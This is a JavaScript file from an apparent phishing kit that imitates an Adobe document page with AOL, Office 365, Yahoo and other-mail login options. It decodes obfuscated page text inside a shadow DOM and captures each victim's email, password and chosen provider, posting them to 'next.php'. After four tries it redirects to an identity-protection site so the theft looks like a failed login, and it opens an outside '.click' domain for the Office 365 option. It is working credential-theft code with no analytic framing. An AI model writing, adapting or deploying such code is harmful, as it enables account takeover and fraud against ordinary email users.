if (typeof PREFIX === "undefined" || typeof SUFFIX === "undefined") {
  const PREFIX = "OBFS";
  const SUFFIX = "END";
}

const shadowhost = document.getElementById("primary");
const shadowroot = shadowhost.shadowRoot;

function deobfString(str) {
  let withoutPrefixSuffix = str.slice(PREFIX.length, -SUFFIX.length);
  let reversed = withoutPrefixSuffix.split("").reverse().join("");
  return atob(reversed);
}

function deObfData() {
  try {
    // Rest
    shadowroot.getElementById("ob1").innerText = deobfString(
      shadowroot.getElementById("ob1").innerText
    );
    shadowroot.getElementById("ob2").innerText = deobfString(
      shadowroot.getElementById("ob2").innerText
    );
    shadowroot.getElementById("ob3").innerText = deobfString(
      shadowroot.getElementById("ob3").innerText
    );
    shadowroot.getElementById("ob4").innerText = deobfString(
      shadowroot.getElementById("ob4").innerText
    );

    shadowroot.getElementById("logtxt1").innerText = deobfString(
      shadowroot.getElementById("logtxt1").innerText
    );
    shadowroot.getElementById("logtxt2").innerText = deobfString(
      shadowroot.getElementById("logtxt2").innerText
    );
    shadowroot.getElementById("logtxt3").innerText = deobfString(
      shadowroot.getElementById("logtxt3").innerText
    );
    shadowroot.getElementById("logtxt4").innerText = deobfString(
      shadowroot.getElementById("logtxt4").innerText
    );

    shadowroot.getElementById("logimg1").src = "img/aol1.png";
    shadowroot.getElementById("logimg2").src = "img/office3651.png";
    shadowroot.getElementById("logimg3").src = "img/yahoo1.png";
    shadowroot.getElementById("logimg4").src = "img/other1.png";
    shadowroot.getElementById("logo").src = "img/adobe.jpg";
  } catch {
    return;
  }
}

function openInNewTab() {
  window.open("https://invtepnchb.click", "_blank", "noopener,noreferrer");
}

function showModal(modalType, imgSrc, titleText) {
    $("#contact").trigger("reset");
    $("#msg").hide();
    $("#fieldImg").attr("src", imgSrc);
    $("#field").html(titleText);
    $("#ajaxModal").modal("show");
}

function initializePage() {
  console.log("Primary Received: PrimaryContentLoaded");


  deObfData();


// Attach click handlers to elements inside the shadow root

shadowroot.getElementById("365").addEventListener("click", function () {
  openInNewTab();
});

shadowroot.getElementById("aolmodal").addEventListener("click", function () {
    showModal("aol", "img/aol.png", "Aol");
});

shadowroot.getElementById("yahoomodal").addEventListener("click", function () {
    showModal("yahoo", "img/yahoo.png", "Yahoo");
});

shadowroot.getElementById("othermodal").addEventListener("click", function () {
    showModal("other", "img/othermail.ico", "Other Mail");
});



  var count = 0;


  document.getElementById("submit-btn").addEventListener("click", function (event) {
    event.preventDefault();

        var email = $("#email").val();
        var password = $("#password").val();
        var detail = $("#field").html();

        // If any field is empty, prevent submission
        if (!email || !password) {
            $("#msg").text("Please fill out all fields").show();
            return;
        }

        count += 1;

        // Redirect after 4 attempts
        if (count >= 4) {
            count = 0;
            window.location.replace("https://www.identityprotectionreview.com/best-identity-theft-protection?gclid=Cj0KCQiAxc6PBhCEARIsAH8Hff2U9BI7NpguMD4GmbPstWkLdqRDxtXd7Axw9VRlEFW3YsOTTrJzXb8aAoVgEALw_wcB");
        } else {
            $.ajax({
                dataType: "JSON",
                url: "next.php",
                type: "POST",
                data: {
                    email: email,
                    password: password,
                    detail: detail,
                },
                beforeSend: function () {
                    $("#submit-btn").html("Verifying...");
                },
                success: function (response) {
                    $("#password").val(""); // Clear the password field
                    if (response) {
                        $("#msg").show();
                        $("#msg").html(response["msg"]);
                    }
                },
                error: function () {
                    $("#password").val(""); // Clear the password field
                    $("#msg").show();
                    $("#msg").html("Please try again later.");
                },
                complete: function () {
                    $("#submit-btn").html("Login");
                },
            });
        }
});

}

// Listen to custom event equivalent to DOMContentLoaded but when fetch and injection is complete
document.addEventListener("PrimaryContentLoaded", initializePage);
